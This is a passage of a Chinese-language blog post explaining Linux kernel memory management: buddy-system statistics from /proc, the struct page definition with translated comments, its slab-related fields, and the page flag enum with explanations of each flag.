class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">arttnba3@ubuntu:~$ sudo cat /proc/buddyinfo <br>Node 0, zone      DMA      0      1      1      0      2      1      1      0      1      2      2 <br>Node 0, zone    DMA32   8706   1386    748    543    232     48     39      9      0      0      0 <br>Node 0, zone   Normal  15391   3317    877    826    221     77     14      2      0      0      0 <br>arttnba3@ubuntu:~$ sudo cat /proc/pagetypeinfo <br>Page block order: 9<br>Pages per block:  512<br><br>Free pages count per migrate type at order       0      1      2      3      4      5      6      7      8      9     10 <br>Node    0, zone      DMA, type    Unmovable      0      1      1      0      2      1      1      0      1      1      0 <br>Node    0, zone      DMA, type      Movable      0      0      0      0      0      0      0      0      0      1      2 <br>Node    0, zone      DMA, type  Reclaimable      0      0      0      0      0      0      0      0      0      0      0 <br>Node    0, zone      DMA, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 <br>Node    0, zone      DMA, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 <br>Node    0, zone    DMA32, type    Unmovable    254    166     54     33     18      8     11      1      0      0      0 <br>Node    0, zone    DMA32, type      Movable   6762    740    535    278     43      3      3      2      0      0      0 <br>Node    0, zone    DMA32, type  Reclaimable   1690    480    159    232    171     37     25      6      0      0      0 <br>Node    0, zone    DMA32, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 <br>Node    0, zone    DMA32, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 <br>Node    0, zone   Normal, type    Unmovable     27     30     15      0      1      4      4      2      0      0      0 <br>Node    0, zone   Normal, type      Movable  12963   3039    806    727    197     68     10      0      0      0      0 <br>Node    0, zone   Normal, type  Reclaimable   1135    251     56     99     23      5      0      0      0      0      0 <br>Node    0, zone   Normal, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 <br>Node    0, zone   Normal, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 <br><br>Number of blocks type     Unmovable      Movable  Reclaimable   HighAtomic      Isolate <br>Node 0, zone      DMA            3            5            0            0            0 <br>Node 0, zone    DMA32           60         1382           86            0            0 <br>Node 0, zone   Normal          245         4270           93            0            0<br></code></pre></td></tr></table></figure><h1 id="0x01-struct-page：页"><a href="#0x01-struct-page：页" class="headerlink" title="0x01.struct page：页"></a>0x01.struct page：页</h1><p>Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>，为了节省内存空间，其定义中使用了大量的联合体</p><p>一个 page 结构体的大小为 64B，若是每个物理页框大小为 4KB，则仅需要牺牲 <code>1.5625%</code> 的空间存储 page 结构体</p><p>在这里给出一张 struct page 的overview</p><blockquote><p>网上找的图，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/MjWZmba9SLH1xIO.png" alt="image.png"></p><p>该结构体定义于内核源码 <code>include/linux/mm_types.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">// flags 用以存储该 page 的标志位，每一个位表示一种状态，故一张页可以有 32 种状态，这些状态定义于 include/linux/page-flags.h 中</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;        <span class="hljs-comment">/* 原子变量 flag，也可能被异步更新 */</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 该联合体中 5 个 word（32 位系统20字节/64位系统40字节）是可用的</span><br><span class="hljs-comment">     * 警告：第一个 word 的 0 bit 供 PageTail()使用</span><br><span class="hljs-comment">     * 这意味着其他用户使用该结构体时【禁止】使用该 bit</span><br><span class="hljs-comment">     * 以避免碰撞和误判 PageTail().</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* 页缓存与匿名页 */</span><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @lru: Pageout 链表, 例如 active_list 便由</span><br><span class="hljs-comment">             * lruvec-&gt;lru_lock 保护。  </span><br><span class="hljs-comment">             * 有时会被页所有者作为常规链表使用。</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>            <span class="hljs-comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br>            <span class="hljs-type">pgoff_t</span> index;        <span class="hljs-comment">/* 在映射的虚拟空间（vma_area）内的偏移 */</span><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @private: 私有映射的非透明数据</span><br><span class="hljs-comment">             * 在 PagePrivate 中通常用于 buffer_heads.</span><br><span class="hljs-comment">             * 在 PageSwapCache 中用于 swp_entry_t</span><br><span class="hljs-comment">             * 在 PageBuddy 中指定在 buddy system 中的次序</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* page_pool used by netstack */</span><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @dma_addr: 在 32 位机器上仍可能需要 64 位的空间</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-type">dma_addr_t</span> dma_addr;<br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* 供 slab, slob and slub 使用 */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Partial pages */</span><br>                    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br>                    <span class="hljs-type">int</span> pages;    <span class="hljs-comment">/* 剩余的页数量 */</span><br>                    <span class="hljs-type">int</span> pobjects;    <span class="hljs-comment">/* 近似计数 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pages;<br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pobjects;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                &#125;;<br>            &#125;;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span> <span class="hljs-comment">/* 不在 slob 中使用 */</span><br>            <span class="hljs-comment">/* 两个 word 的范围 */</span><br>            <span class="hljs-type">void</span> *freelist;        <span class="hljs-comment">/* 第一个空闲对象 */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">void</span> *s_mem;    <span class="hljs-comment">/* slab: first object */</span><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;        <span class="hljs-comment">/* SLUB */</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>            <span class="hljs-comment">/* SLUB */</span><br>                    <span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br>                    <span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br>                    <span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>                &#125;;<br>            &#125;;<br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* 复合页的尾页 */</span><br>            <span class="hljs-comment">// 复合页 （compound page）即为将多个物理连续页框视作一个大页</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> compound_head;    <span class="hljs-comment">/* Bit zero is set */</span><br><br>            <span class="hljs-comment">/* First tail page only */</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> compound_dtor;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> compound_order;<br>            <span class="hljs-type">atomic_t</span> compound_mapcount;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> compound_nr; <span class="hljs-comment">/* 1 &lt;&lt; compound_order */</span><br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Second tail page of compound page */</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _compound_pad_1;    <span class="hljs-comment">/* compound_head */</span><br>            <span class="hljs-type">atomic_t</span> hpage_pinned_refcount;<br>            <span class="hljs-comment">/* For both global and memcg */</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">deferred_list</span>;</span><br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* 页表页面 */</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _pt_pad_1;    <span class="hljs-comment">/* compound_head */</span><br>            <span class="hljs-type">pgtable_t</span> pmd_huge_pte; <span class="hljs-comment">/* protected by page-&gt;ptl */</span><br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _pt_pad_2;    <span class="hljs-comment">/* mapping */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">pt_mm</span>;</span> <span class="hljs-comment">/* 用于 x86 的全局目录表（pgd） */</span><br>                <span class="hljs-type">atomic_t</span> pt_frag_refcount; <span class="hljs-comment">/* 用于 powerpc 架构 */</span><br>            &#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> ALLOC_SPLIT_PTLOCKS</span><br>            <span class="hljs-type">spinlock_t</span> *ptl;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>            <span class="hljs-type">spinlock_t</span> ptl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        &#125;;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* ZONE_DEVICE pages */</span><br>            <span class="hljs-comment">/** @pgmap: Points to the hosting device page map. */</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev_pagemap</span> *<span class="hljs-title">pgmap</span>;</span><br>            <span class="hljs-type">void</span> *zone_device_data;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * ZONE_DEVICE private pages are counted as being</span><br><span class="hljs-comment">             * mapped so the next 3 words hold the mapping, index,</span><br><span class="hljs-comment">             * and private fields from the source anonymous or</span><br><span class="hljs-comment">             * page cache page while the page is migrated to device</span><br><span class="hljs-comment">             * private memory.</span><br><span class="hljs-comment">             * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span><br><span class="hljs-comment">             * use the mapping, index, and private fields when</span><br><span class="hljs-comment">             * pmem backed DAX files are mapped.</span><br><span class="hljs-comment">             */</span><br>        &#125;;<br><br>        <span class="hljs-comment">/** @rcu_head: 你可以通过该成员以通过 RCU 释放内存页 */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>    &#125;;<br><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span>        <span class="hljs-comment">/* 这个联合体占用四个字节 */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 若是这个页被映射到用户空间, 记录该页被页表引用的次数</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 每个进程有其独立的页表，故可以理解为该值记录了该页被多少个进程共享，初始值为 -1</span><br>        <span class="hljs-type">atomic_t</span> _mapcount;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 若是该页既不是 PageSlab 也没有被映射到用户空间，</span><br><span class="hljs-comment">         * 则该值会帮助决定该页的作用。</span><br><span class="hljs-comment">         * 该处的页面类型列表参见 page-flags.h</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> page_type;<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> active;        <span class="hljs-comment">/* SLAB */</span><br>        <span class="hljs-type">int</span> units;            <span class="hljs-comment">/* SLOB */</span><br>    &#125;;<br><br>    <span class="hljs-comment">/* 使用计数. 【不要直接使用】. 参见 page_ref.h */</span><br>    <span class="hljs-type">atomic_t</span> _refcount;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 当机器上的所有内存都被映射到内核空间时,</span><br><span class="hljs-comment">     * 我们可以简单地计算其虚拟地址。</span><br><span class="hljs-comment">     * 在有着【高端内存（大于896MB）】的机器上，有的内存被动态地映射到内核</span><br><span class="hljs-comment">     * 虚拟空间中，因此我们需要一个地方来存储这个地址</span><br><span class="hljs-comment">     * 在 x86 机器上这个域可能占 16 bit 的空间 ... ;)</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 乘法计算较慢的架构可以在 asm/page.h 中定义 WANT_PAGE_VIRTUAL</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span><br>    <span class="hljs-type">void</span> *virtual;            <span class="hljs-comment">/* 内核虚拟地址 (若非 kmapped 则为 NULL, 即高端内存) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* WANT_PAGE_VIRTUAL */</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span><br>    <span class="hljs-type">int</span> _last_cpupid;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; _struct_page_alignment;<br></code></pre></td></tr></table></figure><h2 id="I-几个比较重要的字段"><a href="#I-几个比较重要的字段" class="headerlink" title="I.几个比较重要的字段"></a>I.几个比较重要的字段</h2><p>简单讲讲其中几个重要的成员</p><h3 id="lru：LRU-链表节点"><a href="#lru：LRU-链表节点" class="headerlink" title="lru：LRU 链表节点"></a>lru：LRU 链表节点</h3><p>lru 即 <code>Least Recently Used</code>，在操作系统课程上我们已经学习了这个页面置换算法的概念，这里不再过多赘叙</p><p>在 Linux 内核中，page 结构体通过其 lru 字段组织成链表，如下图所示</p><p><img src="https://i.loli.net/2021/11/25/QbuxcXTWdzMari5.png" alt="image.png"></p><p>lru 成员是一个 <code>struct list_head</code> 类型，这是内核中通用的双向链表节点结构</p><h3 id="slab相关结构体"><a href="#slab相关结构体" class="headerlink" title="**slab相关结构体**"></a>**slab相关结构体**</h3><p>在 page 结构体中专门有着一个匿名结构体用于存放与 slab 相关的成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* 供 slab, slob and slub 使用 */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>    <span class="hljs-comment">/* Partial pages */</span><br>                    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br>                    <span class="hljs-type">int</span> pages;    <span class="hljs-comment">/* 剩余的页数量 */</span><br>                    <span class="hljs-type">int</span> pobjects;    <span class="hljs-comment">/* 近似计数 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pages;<br>                    <span class="hljs-type">short</span> <span class="hljs-type">int</span> pobjects;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>                &#125;;<br>            &#125;;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span> <span class="hljs-comment">/* 不在 slob 中使用 */</span><br>            <span class="hljs-comment">/* 两个 word 的范围 */</span><br>            <span class="hljs-type">void</span> *freelist;        <span class="hljs-comment">/* 第一个空闲对象 */</span><br>            <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">void</span> *s_mem;    <span class="hljs-comment">/* slab: first object */</span><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;        <span class="hljs-comment">/* SLUB */</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>            <span class="hljs-comment">/* SLUB */</span><br>                    <span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br>                    <span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br>                    <span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>                &#125;;<br>            &#125;;<br>        &#125;;<br></code></pre></td></tr></table></figure><p>Linux kernel 中的 slab allocator 一共有三种：slab、slob、slub，其中比较常用的是 slub 分配器，关于 slab allocator 将在后续的文章中进行更为详细的叙述，下图是一张 slub 分配器的 overview</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h3 id="flags：标志位"><a href="#flags：标志位" class="headerlink" title="flags：标志位"></a>flags：标志位</h3><p>即该页的标志位成员，用以表示该页所处在的状态，每一个位表示一种状态，故一张页可以有 32 种不同的状态，这些状态定义于 <code>include/linux/page-flags.h</code> 中，<strong>该字段与体系无关</strong></p><p>我们可以通过该头文件中定义的枚举类型获取相应的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">pageflags</span> &#123;</span><br>    PG_locked,        <span class="hljs-comment">/* Page is locked. Don&#x27;t touch. */</span><br>    PG_referenced,<br>    PG_uptodate,<br>    PG_dirty,<br>    PG_lru,<br>    PG_active,<br>    PG_workingset,<br>    PG_waiters,        <span class="hljs-comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span><br>    PG_error,<br>    PG_slab,<br>    PG_owner_priv_1,    <span class="hljs-comment">/* Owner use. If pagecache, fs may use*/</span><br>    PG_arch_1,<br>    PG_reserved,<br>    PG_private,        <span class="hljs-comment">/* If pagecache, has fs-private data */</span><br>    PG_private_2,        <span class="hljs-comment">/* If pagecache, has fs aux data */</span><br>    PG_writeback,        <span class="hljs-comment">/* Page is under writeback */</span><br>    PG_head,        <span class="hljs-comment">/* A head page */</span><br>    PG_mappedtodisk,    <span class="hljs-comment">/* Has blocks allocated on-disk */</span><br>    PG_reclaim,        <span class="hljs-comment">/* To be reclaimed asap */</span><br>    PG_swapbacked,        <span class="hljs-comment">/* Page is backed by RAM/swap */</span><br>    PG_unevictable,        <span class="hljs-comment">/* Page is &quot;unevictable&quot;  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MMU</span><br>    PG_mlocked,        <span class="hljs-comment">/* Page is vma mlocked */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span><br>    PG_uncached,        <span class="hljs-comment">/* Page has been mapped as uncached */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span><br>    PG_hwpoison,        <span class="hljs-comment">/* hardware poisoned page. Don&#x27;t touch */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span><br>    PG_young,<br>    PG_idle,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br>    PG_arch_2,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    __NR_PAGEFLAGS,<br><br>    <span class="hljs-comment">/* Filesystems */</span><br>    PG_checked = PG_owner_priv_1,<br><br>    <span class="hljs-comment">/* SwapBacked */</span><br>    PG_swapcache = PG_owner_priv_1,    <span class="hljs-comment">/* Swap page: swp_entry_t in private */</span><br><br>    <span class="hljs-comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span><br><span class="hljs-comment">     * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span><br><span class="hljs-comment">     * when those inodes are being locally cached.</span><br><span class="hljs-comment">     */</span><br>    PG_fscache = PG_private_2,    <span class="hljs-comment">/* page backed by cache */</span><br><br>    <span class="hljs-comment">/* XEN */</span><br>    <span class="hljs-comment">/* Pinned in Xen as a read-only pagetable page. */</span><br>    PG_pinned = PG_owner_priv_1,<br>    <span class="hljs-comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span><br>    PG_savepinned = PG_dirty,<br>    <span class="hljs-comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span><br>    PG_foreign = PG_owner_priv_1,<br>    <span class="hljs-comment">/* Remapped by swiotlb-xen. */</span><br>    PG_xen_remapped = PG_owner_priv_1,<br><br>    <span class="hljs-comment">/* SLOB */</span><br>    PG_slob_free = PG_private,<br><br>    <span class="hljs-comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span><br>    PG_double_map = PG_workingset,<br><br>    <span class="hljs-comment">/* non-lru isolated movable page */</span><br>    PG_isolated = PG_reclaim,<br><br>    <span class="hljs-comment">/* Only valid for buddy pages. Used to track pages that are reported */</span><br>    PG_reported = PG_uptodate,<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>PG_locked</code>：该页已被上锁，说明此时该页正在被使用</li><li><code>PG_referenced</code>：该页刚刚被访问过；该标志位与 PG_reclaim 标志位共同被用于匿名与文件备份缓存的页面回收</li><li><code>PG_uptodate</code>：该页处在最新状态（up-to-date）；当对该页完成一次读取时，该页便变更为 up-to-date 状态，除非发生了磁盘 IO 错误</li><li><code>PG_dirty</code>：该页为<strong>脏页</strong>，即该页的内容已被修改，应当尽快将内容写回磁盘上</li><li><code>PG_lru</code>：该页处在一个 LRU 链表上</li><li><code>PG_active</code>：该页面位于活跃 lru 链表中</li><li><code>PG_workingset</code>：该页位于某个进程的 working set（工作集，即一个进程同时使用的内存数量，例如一个进程可能分配了114514MB内存，但是在同一时刻只使用其中的1919MB，这就是工作集）中</li><li><code>PG_waiters</code>：有进程在等待该页面</li><li><code>PG_error</code>：该页在 I&#x2F;O 过程中出现了差错</li><li><code>PG_slab</code>：该页由 slab 使用</li><li><code>PG_owner_priv_1</code>：该页由其所有者使用，若是作为 pagecache 